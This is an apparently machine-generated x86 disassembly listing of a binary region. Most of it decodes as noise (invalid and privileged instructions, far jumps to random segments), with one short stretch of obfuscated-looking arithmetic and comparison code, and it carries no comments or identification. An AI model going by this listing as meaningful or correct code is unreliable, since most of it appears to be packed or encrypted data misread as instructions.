  41df1c:	jnp    0x41dedd
  41df1e:	into   
  41df1f:	or     edx,DWORD PTR [edi+0x65]
  41df22:	hlt    
  41df23:	lods   al,BYTE PTR ds:[esi]
  41df24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df25:	push   ecx
  41df26:	mov    ecx,0x2a591da9
  41df2b:	clc    
  41df2c:	cmp    al,0x35
  41df2e:	sub    DWORD PTR [eax],ecx
  41df30:	sti    
  41df31:	pushf  
  41df32:	jnp    0x41deba
  41df34:	mov    ebx,0x90e0f7dd
  41df39:	inc    eax
  41df3a:	ins    BYTE PTR es:[edi],dx
  41df3b:	pop    es
  41df3c:	cli    
  41df3d:	iret   
  41df3e:	es in  eax,dx
  41df40:	push   edi
  41df41:	push   edi
  41df42:	inc    edx
  41df43:	ret    
  41df44:	pushf  
  41df45:	adc    ebp,DWORD PTR [ecx+0x13758fb2]
  41df4b:	pop    ebx
  41df4c:	adc    DWORD PTR [ecx-0x46],eax
  41df4f:	and    bh,BYTE PTR [ecx-0x25]
  41df52:	mov    dh,bh
  41df54:	or     eax,0xb0ef28d
  41df59:	cmp    ecx,esi
  41df5b:	sbb    ah,BYTE PTR [edx]
  41df5d:	add    BYTE PTR [esi+0x21920cbb],0x30
  41df64:	ins    BYTE PTR es:[edi],dx
  41df65:	(bad)  
  41df66:	xor    al,0x59
  41df68:	cmp    ebp,DWORD PTR [ecx]
  41df6a:	mov    edx,0xff3c7b37
  41df6f:	add    eax,0x937688b5
  41df74:	jl     0x41dfe2
  41df76:	mov    bh,0xb8
  41df78:	xchg   DWORD PTR [edx+ebx*8+0x5708b6e4],eax
  41df7f:	(bad)
  41df82:	test   BYTE PTR [ecx-0x1f],cl
  41df85:	and    DWORD PTR [esp+ecx*4+0x30d5af5f],edx
  41df8c:	fwait
  41df8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df8e:	cmp    edx,DWORD PTR [ebx+edx*4]
  41df91:	mov    esi,0x4ae00b15
  41df96:	pop    ecx
  41df97:	call   FWORD PTR [ebx+0x26]
  41df9a:	scas   eax,DWORD PTR es:[edi]
  41df9b:	shl    BYTE PTR [edi+0x61],1
  41df9e:	jecxz  0x41e01b
  41dfa0:	test   edx,esi
  41dfa2:	push   ebp
  41dfa3:	rcr    BYTE PTR [edx+0x6e606bc0],cl
  41dfa9:	jmp    0xf1b0a39b
  41dfae:	or     DWORD PTR [ecx+eiz*1+0x5e],esp
  41dfb2:	loop   0x41dfd1
  41dfb4:	dec    ebp
  41dfb5:	sbb    DWORD PTR [ebp+0x5013ec24],esp
  41dfbb:	int3   
  41dfbc:	add    ah,BYTE PTR ds:0xb017639e
  41dfc2:	retf   
  41dfc3:	cs sysret 
  41dfc6:	mov    ch,0x86
  41dfc8:	pop    ecx
  41dfc9:	mov    al,0x68
  41dfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfcc:	jp     0x41dfa5
  41dfce:	sbb    dl,ch
  41dfd0:	into   
  41dfd1:	cmp    ch,BYTE PTR [edx+0x24a8de56]
  41dfd7:	ss mov ch,0xd0
  41dfda:	call   0x548e:0xa9b595cd
  41dfe1:	mov    al,0x6
  41dfe3:	test   BYTE PTR [ecx-0x585e1068],cl
  41dfe9:	sub    al,BYTE PTR [ecx+0x72]
  41dfec:	dec    ebx
  41dfed:	jp     0x41e065
  41dfef:	rcr    edx,0xd7
  41dff2:	std    
  41dff3:	ins    DWORD PTR es:[edi],dx
  41dff4:	jle    0x41e012
  41dff6:	mov    WORD PTR [ebx],fs
  41dff8:	icebp  
  41dff9:	cmp    DWORD PTR [edx+0x182bc32b],0x32
  41e000:	mov    BYTE PTR [esi-0x5e6f040b],dl
  41e006:	retf   0x7914
  41e009:	adc    bh,BYTE PTR [ebx]
  41e00b:	adc    esp,esi
  41e00d:	out    0xc2,eax
  41e00f:	and    ecx,ebp
  41e011:	inc    edi
  41e012:	popf   
  41e013:	daa    
  41e014:	jo     0x41dff2
  41e016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e017:	mov    ebx,es
  41e019:	je     0x41e07e
  41e01b:	mov    bl,BYTE PTR [ebx+esi*8-0xd0bc1fe]
  41e022:	inc    eax
  41e023:	iret   
  41e024:	adc    dl,BYTE PTR ds:0xa236b95c
  41e02a:	aas    
  41e02b:	or     eax,0x36edf72f
  41e030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e031:	dec    esp
  41e032:	mov    al,ds:0x7317acd3
  41e037:	aad    0x71
  41e039:	and    al,0x29
  41e03b:	dec    ebx
  41e03c:	bound  edi,QWORD PTR [esi-0x46]
  41e03f:	ja     0x41e048
  41e041:	jno    0x41e0a6
  41e043:	mov    bx,0x30e4
  41e047:	add    al,0x44
  41e049:	and    edi,DWORD PTR [edx-0x270b2774]
  41e04f:	cdq    
  41e050:	jge    0x41e04b
  41e052:	lahf   
  41e053:	test   DWORD PTR ds:0x3bf075a6,edx
  41e059:	add    BYTE PTR [ebx-0x4f02600c],dl
  41e05f:	je     0x41e049
  41e061:	(bad)  
  41e062:	mov    edx,0x70a30991
  41e067:	pop    ds
  41e068:	retf   0x5075
  41e06b:	les    ebx,FWORD PTR [esi-0x1b]
  41e06e:	cwde   
  41e06f:	out    0x52,al
  41e071:	aam    0x55
  41e073:	jns    0x41e08d
  41e075:	xor    eax,0x5409ddcd
  41e07a:	cmp    eax,0x50620c9
  41e07f:	push   0x61d5f86f
  41e084:	ret    
  41e085:	call   0xf07e5b8d
  41e08a:	mov    cs,WORD PTR [eax-0x22]
  41e08d:	pop    edx
  41e08e:	(bad)  
  41e08f:	dec    ebx
  41e090:	stos   DWORD PTR es:[edi],eax
  41e091:	mov    ecx,0x9d7439fd
  41e096:	adc    eax,0x1207bd11
  41e09b:	dec    ecx
  41e09c:	ins    BYTE PTR es:[edi],dx
  41e09d:	dec    ebx
  41e09e:	xlat   BYTE PTR ds:[ebx]
  41e09f:	jne    0x41e069
  41e0a1:	cmp    eax,0x8fe60b0c
  41e0a6:	leave  
  41e0a7:	retf   0x226b
  41e0aa:	adc    ebx,DWORD PTR [eax+0x29c39103]
  41e0b0:	stc    
  41e0b1:	dec    ecx
  41e0b2:	call   DWORD PTR [edx+0x149832ef]
  41e0b8:	xchg   esp,eax
  41e0b9:	ja     0x41e0e5
  41e0bb:	jae    0x41e09e
  41e0bd:	jbe    0x41e132
  41e0bf:	xchg   BYTE PTR [edi-0x4be78712],al
  41e0c5:	dec    ebx
  41e0c6:	inc    ebp
  41e0c7:	inc    esp
  41e0c8:	inc    edi
  41e0c9:	jo     0x41e112
  41e0cb:	lds    eax,FWORD PTR [esi+0x600da9d5]
  41e0d1:	les    esi,FWORD PTR [edx+0x4f0635c3]
  41e0d7:	dec    eax
  41e0d8:	adc    ebx,0x66
  41e0db:	add    BYTE PTR [esi+0x32],ah
  41e0de:	aad    0x4e
  41e0e0:	daa    
  41e0e1:	les    esp,FWORD PTR [edi+0x68414ac7]
  41e0e7:	inc    edx
  41e0e8:	jbe    0x41e125
  41e0ea:	gs push ebx
  41e0ec:	les    ecx,FWORD PTR [eax]
  41e0ee:	xchg   edi,eax
  41e0ef:	xchg   edi,eax
  41e0f0:	jg     0x41e0b3
  41e0f2:	test   DWORD PTR [edx-0x4c5c7a93],ebx
  41e0f8:	add    BYTE PTR [ebp-0x6a9e4676],ah
  41e0fe:	lds    ebp,FWORD PTR [esi]
  41e100:	sbb    edi,DWORD PTR [eax+0x3885354f]
  41e106:	mov    ecx,0xdcd47a2
  41e10b:	inc    esi
  41e10c:	ret    0xd417
  41e10f:	or     ah,dl
  41e111:	test   DWORD PTR [edi+0x716ad257],ebp
  41e117:	pop    es
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	stos   DWORD PTR es:[edi],eax
  41e1f2:	mov    edx,0x3fc6b0af
  41e1f7:	push   ss
  41e1f8:	sbb    BYTE PTR [edx+edx*1-0x2ac6e7e8],bh
  41e1ff:	js     0x41e232
  41e201:	daa    
  41e202:	mov    esi,0xf5153afe
  41e207:	retf   0xa2b9
  41e20a:	inc    edi
  41e20b:	in     al,dx
  41e20c:	or     al,0xdc
  41e20e:	and    ebp,DWORD PTR [esi+0x2]
  41e211:	cs aaa 
  41e213:	adc    edi,DWORD PTR [edi+0xa41ae6a]
  41e219:	dec    edx
  41e21a:	popa   
  41e21b:	pop    es
  41e21c:	stc    
  41e21d:	fmul   QWORD PTR [edi-0x14]
  41e220:	repnz es mov dl,0x2b
  41e224:	mov    eax,?
  41e226:	push   esi
  41e227:	fldenv [ecx+0x55]
  41e22a:	fwait
  41e22b:	mov    cl,0xa4
  41e22d:	outs   dx,BYTE PTR ds:[esi]
  41e22e:	adc    al,0xf4
  41e230:	push   ds
  41e231:	mov    ch,0xeb
  41e233:	lods   eax,DWORD PTR ds:[esi]
  41e234:	mov    al,0xc0
  41e236:	fwait
  41e237:	das    
  41e238:	aad    0xbc
  41e23a:	(bad)  
  41e23b:	je     0x41e28e
  41e23d:	xchg   ecx,eax
  41e23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e23f:	sahf   
  41e240:	es dec ebp
  41e242:	add    cl,bh
  41e244:	rcl    BYTE PTR [edi-0x4b],0xca
  41e248:	stc    
  41e249:	pop    ebp
  41e24a:	xor    BYTE PTR [ebp+0x17e21a7d],ah
  41e250:	pop    ss
  41e251:	in     al,dx
  41e252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e253:	(bad)  
  41e254:	loop   0x41e2bc
  41e256:	xchg   esp,eax
  41e257:	inc    esp
  41e258:	imul   esp,DWORD PTR [esi-0x1613a2b9],0xede06537
  41e262:	cli    
  41e263:	shr    DWORD PTR [eax-0x100cc418],1
  41e269:	in     al,dx
  41e26a:	add    ecx,0xd411e41
  41e270:	scas   al,BYTE PTR es:[edi]
  41e271:	sbb    BYTE PTR [eax],dh
  41e273:	pop    eax
  41e274:	push   edi
  41e275:	fild   DWORD PTR [ecx+0x35]
  41e278:	xlat   BYTE PTR ds:[ebx]
  41e279:	push   esp
  41e27a:	retf   0x5208
  41e27d:	cld    
  41e27e:	std    
  41e27f:	push   ebx
  41e280:	nop
  41e281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e282:	add    eax,DWORD PTR [ecx]
  41e284:	iret   
  41e285:	in     eax,dx
  41e286:	out    dx,eax
  41e287:	mov    ecx,0x923553fb
  41e28c:	mov    al,ds:0x925df4af
  41e291:	sub    edi,DWORD PTR [ecx-0x74]
  41e294:	xchg   edi,eax
  41e295:	cmc    
  41e296:	stos   DWORD PTR es:[edi],eax
  41e297:	add    dh,BYTE PTR [eax]
  41e299:	ds mov ebx,0x34e45e48
  41e29f:	dec    esi
  41e2a0:	xchg   ebp,eax
  41e2a1:	jno    0x41e286
  41e2a3:	test   DWORD PTR [edx],ebp
  41e2a5:	je     0x41e296
  41e2a7:	push   ebp
  41e2a8:	push   edx
  41e2a9:	or     ebp,DWORD PTR [edi-0x6a]
  41e2ac:	inc    eax
  41e2ad:	or     dl,al
  41e2af:	int    0x82
  41e2b1:	js     0x41e251
  41e2b3:	jo     0x41e2b3
  41e2b5:	jle    0x41e24b
  41e2b7:	fld    DWORD PTR [esi-0x44e36868]
  41e2bd:	icebp  
  41e2be:	ret    0x8c68
  41e2c1:	jl     0x41e276
  41e2c3:	(bad)  
  41e2c4:	(bad)  [esi]
  41e2c6:	ja     0x41e271
  41e2c8:	push   cs
  41e2c9:	stos   DWORD PTR es:[edi],eax
  41e2ca:	push   ds
  41e2cb:	jno    0x41e301
  41e2cd:	mov    ds,WORD PTR [edx+0x6b97a43e]
  41e2d3:	dec    ebx
  41e2d4:	cmp    edx,edi
  41e2d6:	loopne 0x41e2e4
  41e2d8:	div    DWORD PTR [ebx+0x4fcbb8ad]
  41e2de:	cwde   
  41e2df:	fidivr DWORD PTR [edi]
  41e2e1:	add    DWORD PTR [ecx+0x4253a166],eax
  41e2e7:	xor    BYTE PTR [esi+0x6b],bl
  41e2ea:	or     ecx,DWORD PTR [ecx+edi*2]
  41e2ed:	lea    ebx,[esi]
  41e2ef:	jmp    0xd83d:0x5c9c16a2
  41e2f6:	adc    BYTE PTR [edx+edx*4-0xb],bh
  41e2fa:	pop    eax
  41e2fb:	jmp    DWORD PTR [edx-0x7f69a35]
  41e301:	xor    DWORD PTR [ebp-0x3177a900],0xfc553d2d
  41e30b:	mov    al,0x74
  41e30d:	in     al,0xfe
  41e30f:	cmp    dh,BYTE PTR [ebx+0x14fe113b]
  41e315:	mov    al,ds:0x344f3f1f
  41e31a:	adc    DWORD PTR [ecx-0x625a74d2],edi
  41e320:	cmp    eax,0x26c9bfad
  41e325:	mov    esp,DWORD PTR [eax]
  41e327:	add    edx,DWORD PTR [esi]
  41e329:	sbb    BYTE PTR ds:0x1522f6c8,0x7d
  41e330:	sub    esi,DWORD PTR [ebp-0x7]
  41e333:	mov    cl,0xf4
  41e335:	and    DWORD PTR [esi],ebp
  41e337:	arpl   dx,ax
  41e339:	rol    DWORD PTR [ecx-0x59],0x1c
  41e33d:	fadd   DWORD PTR [esi-0x704a4f80]
  41e343:	pop    edi
  41e344:	sbb    BYTE PTR fs:[ecx],0x1f
  41e348:	jle    0x41e32f
  41e34a:	jl     0x41e327
  41e34c:	cmc    
  41e34d:	xchg   eax,edx
  41e34f:	jmp    0xe035:0x6db85c5f
  41e356:	mov    bh,0xeb
  41e358:	pop    ss
  41e359:	in     eax,0x53
  41e35b:	cli    
  41e35c:	push   cs
  41e35d:	cmp    DWORD PTR [edx-0x50],esp
  41e360:	cmp    esi,DWORD PTR [edi-0x6204f2f5]
  41e366:	push   ebx
  41e367:	mov    bl,0xb2
  41e369:	outs   dx,DWORD PTR ds:[esi]
  41e36a:	inc    edi
  41e36b:	fcomp  st(2)
  41e36d:	mov    edi,0x464eab65
  41e372:	adc    al,0xa1
  41e374:	and    eax,0x679033d6
  41e379:	test   DWORD PTR [edx-0x48],ebx
  41e37c:	in     eax,dx
  41e37d:	mov    bl,0xed
  41e37f:	push   ss
  41e380:	sbb    al,0x94
  41e382:	sub    eax,0x19be0551
  41e387:	xor    ch,0x1b
  41e38a:	xor    ch,BYTE PTR [ebx]
  41e38c:	mov    edx,0x1426b558
  41e391:	xchg   DWORD PTR [ebp+ebx*8-0x25f17103],eax
  41e398:	loope  0x41e3da
  41e39a:	xor    DWORD PTR [ecx+eiz*1-0x63],ebx
  41e39e:	xor    bl,BYTE PTR [ebx]
  41e3a0:	push   cs
  41e3a1:	push   cs
  41e3a2:	test   eax,edx
  41e3a4:	call   0x2c80:0xc677e6bd
  41e3ab:	dec    edx
  41e3ac:	mov    esp,0xba9ca11f
  41e3b1:	lock jmp ebp
  41e3b4:	jg     0x41e41a
  41e3b6:	aas    
  41e3b7:	out    0xc5,eax
  41e3b9:	mov    gs,edi
  41e3bb:	sub    dh,dh
  41e3bd:	xchg   ecx,eax
  41e3be:	add    ebx,DWORD PTR [ecx-0x7c]
  41e3c1:	iret   
  41e3c2:	(bad)  
  41e3c4:	push   ecx
  41e3c5:	inc    ebp
  41e3c6:	ret    
  41e3c7:	and    BYTE PTR [esi],dl
  41e3c9:	out    dx,eax
  41e3ca:	adc    BYTE PTR [edx+0x6fac8f00],al
  41e3d0:	jns    0x41e3ec
  41e3d2:	mov    ebp,0x4af9761e
  41e3d7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41e3d9:	jns    0x41e400
  41e3db:	bound  esp,QWORD PTR [ebx-0x35]
  41e3de:	add    eax,0xbc7387e8
  41e3e3:	xchg   ebx,eax
  41e3e4:	in     al,0x24
  41e3e6:	idiv   dl
  41e3e8:	mov    cl,0xae
  41e3ea:	dec    esi
  41e3eb:	jmp    0x41e38c
  41e3ed:	add    dl,BYTE PTR [ebx]
  41e3ef:	addr16 loop 0x41e45a
  41e3f2:	bound  esp,QWORD PTR [esi+0x2d5f7806]
  41e3f8:	xor    BYTE PTR ds:0xa562d503,cl
  41e3fe:	test   BYTE PTR ds:0xf27a3f5f,ch
  41e404:	lods   eax,DWORD PTR ds:[esi]
  41e405:	jl     0x41e3c4
  41e407:	xor    BYTE PTR [ecx+0x3d892a4b],ch
  41e40d:	and    al,0x25
  41e40f:	cmp    ch,BYTE PTR [esi-0x7fb8d9f]
  41e415:	int3   
  41e416:	(bad)  
  41e417:	addr16 inc ebx
  41e419:	shl    BYTE PTR [edx],cl
  41e41b:	fcmovu st,st(6)
  41e41d:	xchg   ecx,eax
  41e41e:	pop    ds
  41e41f:	mov    ds:0x34696c99,al
  41e424:	mov    ds:0x3a987bed,eax
  41e429:	add    ah,bh
  41e42b:	pushf  
  41e42c:	push   edi
  41e42d:	pop    ss
  41e42e:	or     BYTE PTR [ebx-0x2f49ef62],ah
  41e434:	push   esp
  41e435:	sbb    eax,0xc38f2d57
  41e43a:	cmc    
  41e43b:	jge    0x41e3c5
  41e43d:	mov    cl,al
  41e43f:	call   0x6c955cc1
  41e444:	cmp    DWORD PTR [edx-0x76],ebx
  41e447:	push   0x3a
  41e449:	sub    al,0xf6
  41e44b:	jecxz  0x41e3dd
  41e44d:	xchg   edi,eax
  41e44e:	mov    al,0xae
  41e450:	(bad)  
  41e451:	arpl   di,si
  41e453:	ret    
  41e454:	fwait
  41e455:	ja     0x41e43d
  41e457:	fs call 0x44dc7467
  41e45d:	ins    DWORD PTR es:[edi],dx
  41e45e:	ins    BYTE PTR es:[edi],dx
  41e45f:	sub    eax,0xdd73b556
  41e464:	cmp    ebp,esp
  41e466:	call   0xb2d5:0xa9d68e7f
  41e46d:	cmp    al,BYTE PTR ds:0xa12376e9
  41e473:	shl    al,cl
  41e475:	push   ds
  41e476:	cmp    al,0x74
  41e478:	shr    ecx,1
  41e47a:	repnz imul ebp,eax,0xffffff8e
  41e47e:	push   0x6e
  41e480:	pop    eax
  41e481:	mov    WORD PTR ds:0xa0264a2e,gs
  41e487:	fld    DWORD PTR [ebx]
  41e489:	xchg   edx,eax
  41e48a:	or     DWORD PTR [eax],eax
  41e48c:	test   al,0x96
  41e48e:	and    BYTE PTR [edi+edx*2],ah
  41e491:	inc    ebp
  41e492:	(bad)  
  41e493:	cs (bad) 
  41e495:	lods   al,BYTE PTR ds:[esi]
  41e496:	daa    
  41e497:	jae    0x41e43b
  41e499:	push   ebx
  41e49a:	mov    ch,0x1
  41e49c:	call   0x5a9b:0x27844444
  41e4a3:	(bad)  
  41e4a4:	inc    ebp
  41e4a5:	inc    edi
  41e4a6:	mov    bh,0x72
  41e4a8:	ss mov ch,0x81
  41e4ab:	sub    BYTE PTR ds:0x24dadbd7,cl
  41e4b1:	test   DWORD PTR [edi+esi*8+0x16],0x50bf09d7
  41e4b9:	iret   
  41e4ba:	jbe    0x41e533
  41e4bc:	add    dh,BYTE PTR [ebp-0x40b5dde6]
  41e4c2:	xchg   ebx,eax
  41e4c3:	pop    es
  41e4c4:	mov    dh,bl
  41e4c6:	dec    eax
  41e4c7:	mov    ah,0x9c
  41e4c9:	and    ebx,DWORD PTR [ecx+ecx*4-0x69a7e58f]
  41e4d0:	aad    0x3e
  41e4d2:	jmp    0xbc13:0x9181244
  41e4d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4da:	cdq    
  41e4db:	lea    eax,[ecx]
  41e4dd:	sbb    cl,BYTE PTR [eax+eax*4]
  41e4e0:	pop    edi
  41e4e1:	push   eax
  41e4e2:	popa   
  41e4e3:	ret    0x1f8a
  41e4e6:	je     0x41e508
  41e4e8:	cmp    eax,eax
  41e4ea:	jmp    0x41e476
  41e4ec:	and    BYTE PTR [edi-0x6],0x72
  41e4f0:	dec    edi
  41e4f1:	sub    bl,cl
  41e4f3:	inc    esp
  41e4f4:	mov    fs,WORD PTR [ebx+0x5241e9d6]
  41e4fa:	dec    esp
  41e4fb:	cmp    edx,esi
  41e4fd:	jmp    0xccff758a
  41e502:	stc    
  41e503:	sbb    al,0x1f
  41e505:	out    dx,al
  41e506:	or     DWORD PTR [edx-0x779e17ff],eax
  41e50c:	mov    eax,0x48321483
  41e511:	shr    DWORD PTR [ebx],cl
  41e513:	xor    al,0x8b
  41e515:	fidivr DWORD PTR [esi-0x26]
  41e518:	xor    eax,0x64f93acb
  41e51d:	idiv   DWORD PTR [esi]
  41e51f:	(bad)  
  41e520:	cmp    BYTE PTR [ecx-0x2e],bl
  41e523:	sbb    BYTE PTR [esi-0x6b],0x69
  41e527:	sbb    al,0x5f
  41e529:	shl    ch,0xf4
  41e52c:	add    esp,eax
  41e52e:	into   
  41e52f:	lea    ebx,[ebx-0x37ff4981]
  41e535:	inc    edx
  41e536:	push   es
  41e537:	sub    eax,0x157440ec
  41e53c:	aad    0xde
  41e53e:	adc    dh,BYTE PTR [ebp-0x413d5882]
  41e544:	cmc    
  41e545:	add    al,0x3c
  41e547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e548:	retf   
  41e549:	hlt    
  41e54a:	xor    edx,DWORD PTR [ecx-0x43f97c4]
  41e550:	add    ecx,DWORD PTR [ecx-0x1a]
  41e553:	lahf   
  41e554:	inc    esi
  41e555:	adc    eax,0x918312b
  41e55a:	and    eax,0x9b9fa289
  41e55f:	mul    DWORD PTR [edi]
  41e561:	cmp    al,0x65
  41e563:	addr16 pop edx
  41e565:	in     eax,dx
  41e566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e567:	jmp    0x41e50f
  41e569:	fmul   QWORD PTR [ebx+0x11fbb3d1]
  41e56f:	xor    eax,DWORD PTR [ecx-0x1a54126a]
  41e575:	xchg   edx,eax
  41e576:	mov    bl,0x7b
  41e578:	int3   
  41e579:	jl     0x41e5c3
  41e57b:	sub    ebp,DWORD PTR [eax+0x67]
  41e57e:	sahf   
  41e57f:	xchg   edi,eax
  41e580:	jb     0x41e532
  41e582:	inc    ebx
  41e583:	lods   al,BYTE PTR ds:[esi]
  41e584:	and    ebx,DWORD PTR [edx]
  41e586:	aad    0xd9
  41e588:	sbb    al,0x9a
  41e58a:	inc    esp
  41e58b:	popa   
  41e58c:	jnp    0x41e56f
  41e58e:	and    al,0xf5
  41e590:	jge    0x41e53f
  41e592:	in     al,dx
  41e593:	call   0xd974:0x52097900
  41e59a:	mov    ch,0xe2
  41e59c:	jl     0x41e60e
  41e59e:	test   DWORD PTR [ecx*2-0x5dfb4481],ebx
  41e5a5:	xchg   esp,eax
  41e5a6:	inc    esi
  41e5a7:	stos   BYTE PTR es:[edi],al
  41e5a8:	cdq    
  41e5a9:	fiadd  DWORD PTR [ecx]
  41e5ab:	pop    ds
  41e5ac:	pop    ss
  41e5ad:	cmp    edi,0xb02e0c1
  41e5b3:	shr    ecx,0xca
  41e5b6:	add    eax,DWORD PTR [eax]
  41e5b8:	add    BYTE PTR [esi+ecx*1+0x1e7a9f90],al
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x9aaae715
  41e5c6:	pcmpeqw mm7,QWORD PTR [ebx+ebp*2+0x37]
  41e5cb:	push   ss
  41e5cc:	sbb    BYTE PTR [edx+edx*1+0x9771818],bh
  41e5d3:	sbb    esi,0xab3b4a35
  41e5d9:	mov    bh,0xd9
  41e5db:	cwde   
  41e5dc:	in     eax,0xd5
  41e5de:	loop   0x41e5bd
  41e5e0:	(bad)  
  41e5e1:	enter  0xc0d2,0xa1
  41e5e5:	call   0x462e:0x919bbaf
  41e5ec:	clc    
  41e5ed:	aam    0x2f
  41e5ef:	push   edx
  41e5f0:	adc    edi,DWORD PTR [eax]
  41e5f2:	aas    
  41e5f3:	sbb    bl,bh
  41e5f5:	aas    
  41e5f6:	jbe    0x41e5fb
  41e5f8:	fistp  WORD PTR [edi-0x1d4adfc4]
  41e5fe:	mov    bl,0xde
  41e600:	loop   0x41e64a
  41e602:	or     al,0xae
  41e604:	inc    ebx
  41e605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e606:	push   ds
  41e607:	pusha  
  41e608:	ffree  st(7)
  41e60a:	sbb    dl,0x41
  41e60d:	enter  0x6d23,0x54
  41e611:	cmp    bh,dh
  41e613:	shl    dh,0x61
  41e616:	jge    0x41e5e8
  41e618:	in     al,dx
  41e619:	pop    ss
  41e61a:	stos   BYTE PTR es:[edi],al
  41e61b:	push   ebp
  41e61c:	xchg   edx,eax
  41e61d:	retf   
  41e61e:	cmp    DWORD PTR [ecx],0x7
  41e621:	ds lahf 
  41e623:	push   edi
  41e624:	sub    esp,DWORD PTR [edx+eiz*8+0x4d]
  41e628:	adc    edx,ebp
  41e62a:	leave  
  41e62b:	mul    BYTE PTR [esi+0x1a]
  41e62e:	test   DWORD PTR [edi+0x7be3e7f3],edi
  41e634:	mov    eax,0xe34a3160
  41e639:	xor    eax,0xea764630
  41e63e:	mov    bl,0x27
  41e640:	cmp    DWORD PTR [edi],0x47c7da2f
  41e646:	test   al,0x8f
  41e648:	mov    cl,0x7f
  41e64a:	xor    DWORD PTR [esi+0x7de0515d],ecx
  41e650:	sbb    ebx,DWORD PTR [ebp-0x5b6655ea]
  41e656:	mov    ebp,0xada45283
  41e65b:	jmp    0x9795:0x5d402558
  41e662:	xor    eax,DWORD PTR [edi]
  41e664:	imul   ecx,DWORD PTR [ebp+0x69],0x312abfe0
  41e66b:	dec    ebp
  41e66c:	pop    esp
  41e66d:	add    dl,BYTE PTR [ebx]
  41e66f:	arpl   WORD PTR [ebx+esi*1-0x638dbb6c],dx
  41e676:	or     cl,ch
  41e678:	into   
  41e679:	(bad)  
  41e67c:	sub    DWORD PTR [edx+ebp*2+0x57],ecx
  41e680:	and    BYTE PTR es:[ebp-0x16027ba3],0xbf
  41e688:	dec    ebx
  41e689:	mov    eax,ds:0x6e3c2833
  41e68e:	daa    
  41e68f:	aam    0xe7
  41e691:	sbb    DWORD PTR [edx+0x49],eax
  41e694:	and    DWORD PTR [edx+eiz*8],edx
  41e697:	test   ch,0xfd
  41e69a:	push   ecx
  41e69b:	ret    
  41e69c:	jp     0x41e6c6
  41e69e:	cdq    
  41e69f:	adc    eax,0x15c8d4e4
  41e6a4:	sahf   
  41e6a5:	sub    eax,0xef908195
  41e6aa:	dec    ecx
  41e6ab:	pusha  
  41e6ac:	inc    ebx
  41e6ad:	outs   dx,DWORD PTR ds:[esi]
  41e6ae:	push   edx
  41e6af:	smsw   WORD PTR [eax]
  41e6b2:	shl    DWORD PTR [esi-0x65],1
  41e6b5:	sub    BYTE PTR [edx+0x4],ah
  41e6b8:	sub    esi,ecx
  41e6ba:	and    BYTE PTR [ebp-0x5ab6ecd0],ch
  41e6c0:	stos   DWORD PTR es:[edi],eax
  41e6c1:	sub    dl,BYTE PTR [esi]
  41e6c3:	mov    ch,0xe7
  41e6c5:	adc    al,0xf
  41e6c7:	int3   
  41e6c8:	rcl    DWORD PTR [eax],1
  41e6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6cb:	cmc    
  41e6cc:	pop    ds
  41e6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6ce:	shl    DWORD PTR [ebx+0x6582a819],1
  41e6d4:	ds sti 
  41e6d6:	xchg   esi,eax
  41e6d7:	enter  0x4428,0x8
  41e6db:	fbld   TBYTE PTR [eax+0x2e]
